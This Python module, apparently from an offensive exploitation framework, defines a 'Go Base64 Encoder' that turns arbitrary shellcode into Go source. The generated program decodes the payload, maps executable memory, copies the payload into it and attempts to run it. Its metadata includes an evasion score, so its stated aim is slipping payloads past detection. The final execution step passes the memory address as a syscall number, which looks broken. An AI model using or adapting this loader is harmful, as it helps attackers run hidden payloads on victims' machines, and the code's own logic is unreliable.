"""Go base64 encoder — gera source Go com payload embutido."""

import base64
from embedxpl.core.exploit.encoders import BaseEncoder
from embedxpl.core.exploit.payloads import Architectures


class Encoder(BaseEncoder):
    __info__ = {
        "name": "Go Base64 Encoder",
        "description": "Generates Go source with base64-encoded payload + mmap exec.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
        "evasion_score": 5,
    }

    architecture = None

    def encode(self, payload: bytes) -> bytes:  # type: ignore[override]
        b64 = base64.b64encode(payload).decode()
        src = (
            'package main\nimport ("encoding/base64";"os";"syscall";"unsafe")\n'
            f'func main() {{\n'
            f'    sc, _ := base64.StdEncoding.DecodeString("{b64}")\n'
            '    addr, _, _ := syscall.Syscall(syscall.SYS_MMAP, 0, uintptr(len(sc)),\n'
            '        syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,\n'
            '        syscall.MAP_ANON|syscall.MAP_PRIVATE, 0, 0)\n'
            '    for i, b := range sc { *(*byte)(unsafe.Pointer(addr + uintptr(i))) = b }\n'
            '    syscall.Syscall(addr, 0, 0, 0); os.Exit(0)\n'
            '}\n'
        )
        return src.encode()
